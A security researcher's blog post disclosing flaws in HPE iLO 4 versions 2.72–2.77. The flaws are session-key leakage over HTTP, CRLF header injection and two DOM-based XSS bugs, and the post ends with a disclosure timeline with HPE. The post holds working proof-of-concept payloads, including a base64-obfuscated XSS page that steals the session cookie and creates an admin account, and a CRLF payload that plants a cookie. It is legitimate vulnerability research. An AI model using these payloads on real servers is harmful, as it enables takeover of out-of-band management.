---
layout: post
title: "Multiple security flaws in HPE iLO 4"
tags: research vulnerability-disclosure english
---

{% assign asciiart_padding = 1 %}
{% assign asciiart_align = 'left' %}
## .--[ 0 - Context ]-----------------------------------

A couple of months ago, I bought a second-hand `HPE Proliant 360P Gen8` server
to start building a homelab. Like other HPE models, it has integrated iLO
(Integrated Lights-Out) technology, which allows for out-of-band management
(OOBM). My server, in particular, features iLO 4, the fourth generation of this
system.

Recently, I began a general analysis of the iLO on my server and identified
four significant vulnerabilities that could enable a series of attacks on its
web interface. My initial research was conducted on version 2.72, but I found
that the vulnerabilities persisted up to version 2.77.


## .--[ 1 - Integrated Lights-Out ]--------------------

HPE's Integrated Lights-Out (iLO) technology is an embedded server management
tool designed to offer advanced remote management capabilities, enabling
administrators to control servers remotely. This includes health monitoring, a
graphical remote console, virtual media mounting, among other things which
streamline server management and maintenance tasks.

Particularly, iLO 4 comes integrated into 8th and 9th generation Proliant
servers, with its latest update released on March 2, 2023, in version 2.82.

![ilo4-dashboard]({% img dashboard.png %}){:class="imgcenter"}
*iLO 4's web interface*


## .--[ 2 - Particular interest in older versions ]-----

The versions I decided to analyze were 2.72 and later 2.77, released on
12/20/2019 and 12/17/2020, respectively. Although these are relatively old,
they are still widely used by the _homelabbing_ community. This is because
patches have been developed that allow for more granular control over the speed
of the server's internal fans[0]; something particularly interesting for
individuals who have their homelab inside their house and cannot tolerate the
noise level that one of these devices produces with its factory settings. Since
later firmware versions do not allow this modification[1][2], many people prefer
to sacrifice updates for the ability to quiet down their server.

{% asciiart %}
[0] https://github.com/kendallgoto/ilo4_unlock
[1] https://www.reddit.com/r/homelab/comments/sx3ldo/comment/hxze895/
[2] https://www.reddit.com/r/homelab/comments/hix44v/comment/hxnodss/
{% endasciiart %}


## .--[ 3 - Findings ]----------------------------------
> Note: ilo4-01.madoka.pink is my iLO 4's FQDN.

### Vulnerability 1: Use of an insecure channel

By default, access to the iLO 4 web interface is restricted to HTTPS. However,
there is a specific section of the site where the application makes requests
over HTTP, transmitting data in plain text across the network.

Although the session cookie has the Secure flag set -preventing it from being
included in HTTP requests- the endpoint in question sends the session
information through a URL parameter, making it possible to capture it by
intercepting traffic.

It is important to note that most modern browsers block this "HTTPS to HTTP"
redirection[0], making this attack only feasible if the victim uses an outdated
browser, such as Internet Explorer.

#### -..- Analysis -..-

iLO 4 offers the possibility of remotely accessing the server's KVM through a
remote console built on the Microsoft .NET Framework. This console is launched
using Microsoft's ClickOnce technology and by downloading a configuration file
from the web interface.

![ilo4-net-irc]({% img net-irc-ui.png %})

Clicking on "Launch" generates a request to
`https://ilo4-01.madoka.pink/html/IRC.application` (note the https) with
multiple parameters in the URL. Notably, the _sessionKey_ parameter corresponds
to the user's session cookie. The server responds to this with a redirection to
the same endpoint, but over HTTP.

![iLO 4 HTTP redirect]({% img net-irc-req1.png %}){:class="imgcenter"}

This request, in turn, returns the configuration file for the application to
be launched locally.

![ilo4-irc-req]({% img net-irc-req.png %}){:class="imgcenter"}
*.NET IRC config file request*

#### -..- Proof of Concept (PoC) -..-

1\. Access iLO through Internet Explorer with a user that has "Remote Console Access" permissions.

![iLO 4 Internet Explorer]({% img ie-access.png %}){:class="imgcenter"}

Note that the session cookie has the Secure flag set.

![iLO 4 session cookie]({% img ie-session-cookie.png %}){:class="imgcenter"}

2\. Capture all GET requests generated towards the iLO host over HTTP with the following command[1]:

{% highlight bash%}
tcpdump -A -n -q -t \
    --interface=wlan0 \
    --snapshot-length=0 \
    'tcp dst port 80 and host ilo4-01.madoka.pink and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x'$(tohex "GET ")
{% endhighlight %}

3\. Deploy the .NET IRC from the browser by clicking on "Launch".

![iLO 4 .NET IRC]({% img ie-launch-irc.png %}){:class="imgcenter"}

4\. Observe how the HTTP request is captured.

![iLO 4 tcpdump]({% img ie-tcpdump.png %}){:class="imgcenter"}

As explained above, the session cookie is not included in the HTTP headers.
However, due to the nature of the endpoint, it is present in the URL.


{% asciiart %}
[0] https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content
[1] tohex(){ printf '%s' "$1" | xxd -p -u }
{% endasciiart %}

### Vulnerability 2: CRLF Injection

This vulnerability affects the same endpoint that was described in the previous
section: `https://ilo4-01.madoka.pink/html/IRC.application`.

Since the complete URL is reflected in one of the response headers, it seems
natural to attempt injecting a newline to append additional content.

![iLO 4 reflected URL]({% img crlf-reflected.png %}){:class="imgcenter"}

During experimentation, I observed that the redirection occurs whenever the URL
ends with "*?*".

![iLO 4 Test 1]({% img crlf-test1.png %}){:class="imgcenter"}

Furthermore, if this condition is not met, the server's response includes (what
appears to be) the original redirection and a 400 status code.

![iLO 4 Test 2]({% img crlf-test2.png %}){:class="imgcenter"}

Although I was unable to exploit this behavior, it is still pretty interesting
:)

Subsequently, I tried inserting a newline (CR and LF specifically) in the URL,
expecting it to be reflected in the server's response.

The payload I used was:

{% highlight bash%}
https://ilo4-01.madoka.pink/html/IRC.application/%0d%0aHEADER?
{% endhighlight %}

Which would effectively inject the following string:

{% highlight bash%}
https://ilo4-01.madoka.pink/html/IRC.application/
HEADER?
{% endhighlight %}

Fortunately, it worked.

![iLO 4 CRLF Injection 1]({% img crlf-inj1.png %}){:class="imgcenter"}

This confirms that it is possible to inject line breaks into the server's
response, potentially altering the browser's behavior in some way.

The context of this injection, where the response is a redirection and we do
not control the complete value of the "Location" header, makes exploiting it
very challenging. Nonetheless, it is possible to increase the impact of this
vulnerability by combining it with another, which we will explore later.

### Vulnerability 3: DOM-Based XSS in Java IRC via window.name value

In the "Integrated Remote Console" section, which we explored earlier, there is
a functionality to access the server's KVM using Java Web Start (JWS) or
through an applet-based console. In this case, we will focus on the latter.

![iLO 4 Applet button]({% img xss-applet-button.png %}){:class="imgcenter"}

#### -..- Analysis -..-

Clicking the "Applet" button brings up the following:

![]({% img xss-applet-irc.png %}){:class="imgcenter"}

Which is simply an iframe of
`https://ilo4-01.madoka.pink/html/java_irc.html?lang=en`.

![]({% img xss-applet-iframe.png %}){:class="imgcenter"}

In the source code of `/html/java_irc.html?lang=en`, we find the following block
of Javascript (with some unnecessary parts redacted).

{% highlight javascript %}
<script type="text/javascript">
    var _app = navigator.appName;
    var skey = readCookie("sessionKey");
    var langId = getSearchValue(location.search,"lang");
    var rport = window.name;

    if (_app == 'Netscape') {
        document.writeln("<embed code=\"com.hp.ilo2.intgapp.intgapp.class\"");
        document.writeln("type=\"application/x-java-applet\"");
        document.writeln("archive=/html/intgapp4_231.jar width=200 height=100");
        // Many document.writeln calls
        document.writeln("RCINFO1=\""+skey+"\"");
        document.writeln("RCINFO6=\""+rport+"\"");
        document.writeln("RCINFOLANG=\""+langId+"\"");
        // Many document.writeln calls
        document.writeln("<\/noembed>");
        document.writeln("<\/embed>");
    }
    else if (_app == 'Microsoft Internet Explorer') {
        // Same code as above with slight changes
    }
    else {
        alert('Message from Generic Browser');
    }
</script>
{% endhighlight %}

The variable `rport` immediately stands out as it takes its value from
`window.name`, whose content can potentially be controlled by us. Moreover,
this variable is appended to the DOM without being sanitized first.

{% highlight javascript %}
var rport = window.name;
// ...
document.writeln("RCINFO6=\""+rport+"\"");
{% endhighlight %}

It is easy to verify this by going to
`https://ilo4-01.madoka.pink/html/java_irc.html?lang=en`, manually changing the
value of `window.name`, and reloading the page.

![]({% img xss-applet-window.name.png %}){:class="imgcenter"}

![]({% img xss-applet-inj1.png %}){:class="imgcenter"}
*Injected value closing the "embed" tag*

Therefore, if we find a way to control the value of window.name, we can inject
arbitrary Javascript code into the site.

A simple way to do this is by creating a malicious website that changes the
value of `window.name` and then redirects the user to the vulnerable component
at `https://ilo4-01.madoka.pink/html/java_irc.html?lang=en`.

Something like this:

{% highlight html %}
<!DOCTYPE HTML>
<html>
    <head>
        <title>HPE iLO 4 XSS PoC</title>
    </head>
    <script>
        window.name = '"><script>alert(document.location)<\/script><embed';
        window.location ='https://ilo4-01.madoka.pink/html/java_irc.html?lang=en';
    </script>
</html>
{% endhighlight %}

If a user who is already logged into iLO visits a site containing the above
code, the XSS would execute successfully.

![]({% img xss-applet-alert.png %}){:class="imgcenter"}

![]({% img xss-applet-alert-detail.png %}){:class="imgcenter"}
*Detail of the injected payload*

**[*] Important Detail: The only reason this exploit works is because the
session cookie, sessionKey, is not set to SameSite! If it were, it would not be
sent with the window.location, and there would be no access to the vulnerable
component.**

#### -..- Weaponization -..-

Now that we know we can execute arbitrary Javascript code, let's see how much
damage an attacker could potentially cause.

Within iLO, there is a user management section that allows creating, editing,
and deleting users with different levels of permissions.

![]({% img xss-applet-user-admin.png %}){:class="imgcenter"}

The most obvious attack would be to create a user with elevated permissions
using the XSS. To do this, we simply need to inject the following Javascript
code (omitting the comments):

{% highlight javascript %}
// We obtain the session cookie. This is only possible because it is not HttpOnly!
var session_key = document.cookie.split("; ").filter(x => x.indexOf("sessionKey") == 0)[0].split("=")[1];
// We generate a request that creates a user with the highest level of privileges.
var xmlhttp = new XMLHttpRequest();
var endpoint = "https://ilo4-01.madoka.pink/json/user_info";
xmlhttp.open("POST", endpoint);
xmlhttp.setRequestHeader("Content-Type", "application/json");
xmlhttp.send(JSON.stringify({
    "login_name": "xsspoc",
    "user_name": "xsspoc",
    "password": "12345678",
    "remote_cons_priv": 1,
    "virtual_media_priv": 1,
    "reset_priv": 1,
    "config_priv": 1,
    "user_priv": 1,
    "method": "add_user",
    "session_key": session_key
}));
{% endhighlight %}

To embed this in the malicious site, we encode it in base64 to avoid issues
with quotes or other special characters.

{% highlight html %}
<!DOCTYPE HTML>
<html>
    <head>
        <title>HPE iLO4 XSS PoC</title>
    </head>
    <script>
        s = '"><script>eval(atob("dmFyIHNlc3Npb25fa2V5ID0gZG9jdW1lbnQuY29';
        s += 'va2llLnNwbGl0KCI7ICIpLmZpbHRlcih4ID0+IHguaW5kZXhPZigic2Vzc2l';
        s += 'vbktleSIpID09IDApWzBdLnNwbGl0KCI9IilbMV07CnZhciB4bWxodHRwID0';
        s += 'gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CnZhciBlbmRwb2ludCA9ICJodHRwczo';
        s += 'vL2lsbzQtMDEubWFkb2thLnBpbmsvanNvbi91c2VyX2luZm8iOwp4bWxodHR';
        s += 'wLm9wZW4oIlBPU1QiLCBlbmRwb2ludCk7CnhtbGh0dHAuc2V0UmVxdWVzdEh';
        s += 'lYWRlcigiQ29udGVudC1UeXBlIiwgImFwcGxpY2F0aW9uL2pzb24iKTsKeG1';
        s += 'saHR0cC5zZW5kKEpTT04uc3RyaW5naWZ5KHsKICAgICJsb2dpbl9uYW1lIjo';
        s += 'gInhzc3BvYyIsCiAgICAidXNlcl9uYW1lIjogInhzc3BvYyIsCiAgICAicGF';
        s += 'zc3dvcmQiOiAiMTIzNDU2NzgiLAogICAgInJlbW90ZV9jb25zX3ByaXYiOiA';
        s += 'xLAogICAgInZpcnR1YWxfbWVkaWFfcHJpdiI6IDEsCiAgICAicmVzZXRfcHJ';
        s += 'pdiI6IDEsCiAgICAiY29uZmlnX3ByaXYiOiAxLAogICAgInVzZXJfcHJpdiI';
        s += '6IDEsCiAgICAibWV0aG9kIjogImFkZF91c2VyIiwKICAgICJzZXNzaW9uX2t';
        s += 'leSI6IHNlc3Npb25fa2V5Cn0pKTsK"))<\/script><embed';
        window.name = s;
        window.location ='https://ilo4-01.madoka.pink/html/java_irc.html?lang=en';
    </script>
</html>
{% endhighlight %}

Once the XSS is exploited, the newly created user will appear in the user
management section.

![]({% img xss-applet-user-created.png %}){:class="imgcenter"}


### Vulnerability 4: DOM-Based XSS in Java IRC via "sessionKey" cookie value

This vulnerability is identical to the one in the previous section but involves
injecting Javascript code through a different variable.

#### -..- Analysis -..-

The vulnerable code fragment remains the same:

{% highlight javascript %}
<script type="text/javascript">
    var _app = navigator.appName;
    var skey = readCookie("sessionKey");
    var langId = getSearchValue(location.search,"lang");
    var rport = window.name;

    if (_app == 'Netscape') {
        document.writeln("<embed code=\"com.hp.ilo2.intgapp.intgapp.class\"");
        document.writeln("type=\"application/x-java-applet\"");
        document.writeln("archive=/html/intgapp4_231.jar width=200 height=100");
        // Many document.writeln calls
        document.writeln("RCINFO1=\""+skey+"\"");
        document.writeln("RCINFO6=\""+rport+"\"");
        document.writeln("RCINFOLANG=\""+langId+"\"");
        // Many document.writeln calls
        document.writeln("<\/noembed>");
        document.writeln("<\/embed>");
    }
    else if (_app == 'Microsoft Internet Explorer') {
        // Same code as above with slight changes
    }
    else {
        alert('Message from Generic Browser');
    }
</script>
{% endhighlight %}

However, the variable that stands out now is `skey`, which apparently takes its
value from the `sessionKey` cookie, aka. the session cookie. As before, it is
appended to the DOM without further sanitization.

{% highlight javascript %}
var skey = readCookie("sessionKey");
// ...
document.writeln("RCINFO1=\""+skey+"\"");
{% endhighlight %}

Additionally, we can see that the `readCookie` function simply extracts the
value of the specified cookie and returns it without sanitizing.

{% highlight javascript %}
function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i MENORQUE ca.length; i++) {
        var c = ca[i];
        if (c.charAt(0) == ' ')
            c = c.substring(1, c.length);

        if (c.indexOf(nameEQ) == 0)
            return c.substring(nameEQ.length, c.length);
    }
    return null;
}
{% endhighlight %}

This means that if we manage to inject our payload into the `sessionKey`
cookie, the XSS will trigger upon accessing
`https://ilo4-01.madoka.pink/html/java_irc.html?lang=en`, right? Well,
accessing the vulnerable component is only possible when authenticated, i.e.,
with a valid session cookie. Otherwise, the server returns an error.

![]({% img xss-cookie-noauth.png %}){:class="imgcenter"}
*Vulnerable endpoint when accesed unauthenticated*

What a shame, if the session cookie is not valid, it seems impossible to
exploit the vulnerability.

Fortunately for us, the server appears to process the value of this cookie in a
somewhat peculiar way, so all is not lost. After experimenting for a while, I
concluded that it can have any value as long as it starts with a valid session
cookie. In the backend, something like this must be happening (pseudocode in
Python):

{% highlight python %}
# Session cookies have a fixed 16 byte length
session_cookie = request.cookies["sessionKey"][:32]
{% endhighlight %}

All the following cookies allow successful access to the vulnerable component:

![]({% img xss-cookie-valid1.png %}){:class="imgcenter"}

![]({% img xss-cookie-valid2.png %}){:class="imgcenter"}

![]({% img xss-cookie-valid3.png %}){:class="imgcenter"}

Perfect, now we just need to figure out how can we modify the value of
`sessionKey` for another user and then redirect them to
`/html/java_irc.html?lang=en`, just like in the previous section.

For this, the CRLF injection detailed at the beginning is perfect for two
reasons:

1. The endpoint by default generates a redirection.
2. The vulnerability allows us to inject HTTP response headers, enabling us to
   set arbitrary cookies with "Set-Cookie".

Using this information, the final payload will look like this:

{% highlight URL %}
%2f..%2fjava_irc.html%3flang%3den%0d%0aSet-Cookie%3a%20sessionKey%3d[SESSIONCOOKIE][XSSPAYLOAD]%20%3b%20path%3d/%3b%20secure%0d%0aFAKE:%20HEADER?
{% endhighlight %}

Which in practice injects the following:

{% highlight URL %}
/../java_irc.html?lang=en
Set-Cookie: sessionKey=[SESSIONCOOKIE][XSSPAYLOAD] ; path=/; secure
FAKE: HEADER?
{% endhighlight %}

![]({% img xss-cookie-example-inj.png %}){:class="imgcenter"}
*Final CRLF injection*

Let's take a moment to understand what's happening in the server's response.
First, the "Location" header is set to
`http://ilo4-01.madoka.pink/html/IRC.application/../java_irc.html?lang=en`, which
normalizes to `http://ilo4-01.madoka.pink/html/java_irc.html?lang=en`, the
XSS-vulnerable component! Additionally, the `Set-Cookie` header is being injected
with a value we control. These two actions fulfill the requirements we defined
earlier: controlling the cookie value and redirecting the user.

However, not everything is perfect. As you may have noticed, the malicious URL
must already include a valid session cookie, which means this vulnerability can
only be exploited by an attacker who already has access to iLO. Moreover, the
Javascript code will execute in the context of the attacker's session and not
the user accessing the URL. Despite this, it is still a vulnerability, and I
find the exploitation chain quite fascinating to be honest.

#### -..- Extra Ideas -..-

Perhaps the first XSS could be used to obtain the victim's session cookie so it
can be used in this attack later. Another option would be to automatically
exploit this XSS so that the victim's cookie has a persistent payload. I haven't
explored the possibilities much, but I'm sure there are many interesting paths.


## .--[ 4 - Timeline of Interaction with HPE PSRT ]-----

- 03-05-24: I sent my first email to the HPE Product Security Response Team (PSRT), explaining the vulnerabilities I found in iLO version 2.73.
- 03-05-24: PSRT responded, highlighting that the latest available version is 2.82 and requesting that I conduct my tests on this version.
- 08-05-24: After testing, I confirmed that all the reported vulnerabilities were patched in version 2.82. I then inquired about the possibility of publishing my findings, given how old version 2.73 is.
- 11-05-24: PSRT replied, asking for an advance copy of the final report to coordinate the publication.
- 27-05-24: I sent them a draft of the final report.
- 10-06-24: I requested an update on the status of the report review but received no response.
- 24-06-24: I followed up with a second request for an update but, again, received no response.
- 08-07-24: I sent a third request for an update on the review of my report. Once more, I did not receive any response.
- 01-08-24: Given the lack of response, I decided to publish my report on my blog.
